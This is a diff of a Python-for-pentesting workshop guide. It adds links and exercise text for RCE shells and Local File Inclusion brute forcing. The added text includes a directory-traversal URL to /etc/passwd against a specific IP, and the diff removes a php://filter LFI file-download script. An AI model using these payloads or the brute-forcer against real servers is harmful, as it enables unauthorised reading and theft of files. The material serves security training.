@@ -63,10 +63,18 @@ Python has all the standard string manipulation functions built-in. Search&Repla
 
 "aattonajanottaa" is a string object and ```split``` is a method in string. The result is a list (vector) which you get if you cut it to pieces for each "j" in the string.
 
-### UTF-8
+### Strings, UTF-8
 
 UTF-8 and encodings are a bit annoying. Python 2.7 and 3.x behave differently, so be careful about what you are doing if you need to handle special characters in strings.
 
+These all create strings with the character A in it.
+```
+t = "A"
+t = u'A'    # unicode 
+t = "\x41"  # hex encoded character
+```
+
+```hex```, ```chr```, ```ord```, ```decode``` and [repr](https://docs.python.org/2/library/repr.html) are particularly useful functions for our purposes in Python. Also [pprint](https://docs.python.org/2/library/pprint.html) which is standard stuff in REPL languages.
 
 ## Data structures
 
@@ -81,22 +89,22 @@ a ```set``` is also useful and works like you would expect from a set. With sets
 
 ## dependencies
 
-*pip* is the mechanism for handling dependencies. In a "real" use i would be preferable to use something like *venv* to isolate separate
-projects from each other to manage version issues with dependencies and the core language versions. We'll skip that now.
+[pip](https://packaging.python.org/tutorials/installing-packages/) is the mechanism for handling dependencies. In a "real" use i would be preferable to use something like [venv](https://docs.python.org/3/library/venv.html) to isolate separate projects from each other to manage version issues with dependencies and the core language versions. We'll skip that now.
 
 ## References
 
-* The official Python site has the language reference and API reference for the core: https://docs.python.org/2/contents.html
+* The official Python site has the language reference and API reference for the core: (https://docs.python.org/2/contents.html)
+* Standard functions of Python: (https://docs.python.org/2/library/functions.html)
 * [requests](http://docs.python-requests.org/en/master/) is a nice HTTP library.
 * [scapy](https://scapy.net/) is the Swiss army knife for all network hacking stuff in Python. Not necessary for trivial tasks.
 * For fuzzing, [Radamsa](https://github.com/aoh/radamsa) is nice. See [Swissfuzz](https://github.com/ouspg/swissfuzz) and [Heartbreaker](https://github.com/lokori/heartbreaker) for Python interfacing.
+* [SecLists](https://github.com/danielmiessler/SecLists) contains very useful lists for usernames, parameters and other things. Use them as input for your scripts.
+
 
 
 # Task 1, RCE -> forward shell
 
-We have found a web server in our penetration test that seems to be vulnerable and allows remote code execution (RCE). It's tedious and time consuming to
-further exploit the server by manually crafting HTTP requests and parsing the responses from the server, so let's write a "shell" with Python that
-makes it pleasant to access the server.
+We have found a web server in our penetration test that seems to be vulnerable and allows [remote code execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution), RCE. It's tedious and time consuming to further exploit the server by manually crafting HTTP requests and parsing the responses from the server, so let's write a "shell" with Python that makes it pleasant to access the server.
 
 (Obviously, if you could [get easily a reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) from the server this wouldn't be necessary, but it's not always easy. Sometimes it can be pretty impossible even though you clearly have RCE.)
 
@@ -159,51 +167,30 @@ This code might be useful as a starting point: [XOR-guesser.py](src/XOR-guesser.
 
 # Task 3 
 
-Brute force LFI.
+Brute force [Local File Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion).
 
-Every now and and then one needs to brute force something out of a web server. dirb, dirbuster and gobuster are fine for basic enumeration. wfuzz is great. ffuf is superb.
-Burp Intruder is often an excellent choice.
+Every now and and then one needs to brute force something out of a web server. [dirb](https://tools.kali.org/web-applications/dirb), [dirbuster](https://tools.kali.org/web-applications/dirbuster) and [gobuster](https://github.com/OJ/gobuster) are fine for basic enumeration. [wfuzz](https://github.com/xmendez/wfuzz) is great. [ffuf](https://github.com/ffuf/ffuf) is superb!
+[Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using) is often an excellent choice.
 
 But sometimes you need something custom made so let's make a brute forcer. (This can be easily converted into brute forcing logins or other things aside from LFI). The actual list 
 of potentially interesting files depends on the target of course and there might be some limitations on directory traversal and some special encodings that need to be done.
 
-Luckily for us, we already have identified a vulnerable endpoint we can try to exploit.
+Luckily for us, we already have identified a vulnerable endpoint we can try to exploit: (http://34.243.97.41/site.php?op=menu)
 
+It seems that the parameter ```op``` can be exploited. Try this for a PoC: (http://34.243.97.41/site.php?op=../../../../../../etc/passwd)
 
+Now, try to:
 
-This code might be useful as a starting point for this:
+* Modify the template program to fetch files from the external server.
+* Try to download interesting files from the server. SecLists can give you some ideas. Also, you could identify the operating system and services with [nmap](https://nmap.org/).
+* If possible, try to separate "not found" from the "no access rights". Might not be possible.
+
+Bonus ideas:
+* Maintain a list of previous attempts and only try new files that haven't been tried already.
+* Make a tester that can automatically test all common LFI vulns from a given HTTP parameter. See the awesome [High On Coffee LFI cheat sheet](https://highon.coffee/blog/lfi-cheat-sheet/) to get some ideas for this.
+
+There is some code that might be useful as a starting point: (src/LFI-template.py)
 The program actually downloads and writes the remote files to the current directory so careful here.
-```
-files = set()
-with open('files.txt') as f:
-    for line in f:
-      if (line[0] != "#"):
-        files.add(line.rstrip(' ').rstrip('\n'))
-
-print(files)
-print("\n-----")
-
-count = 0
-for lfi in files:
-    print("Still trying.. " + lfi)
-    time.sleep(0.05)
-    fn = lfi.split("/")[-1] + ".BAR"
-    if (not (os.path.isfile(fn))):
-      repla = requests.get(args.url + "php://filter/read=convert.base64-encode/resource=" + urllib.quote_plus(lfi))
-      if (repla.status_code == 200):
-        base64encoded = repla.text.split(args.begin)[1]
-        base64encoded = base64encoded.split(args.end)[0]
-        print("FILE : " + lfi)
-        content=base64.b64decode(base64encoded)
-        print(content)
-        with open(fn, "w") as f:
-          f.write(content)
-        print("---------------")
-      else:
-        print("STATUS : " + str(repla.status_code))
-    count = count + 1
-
-```
 
 
 # Task 4
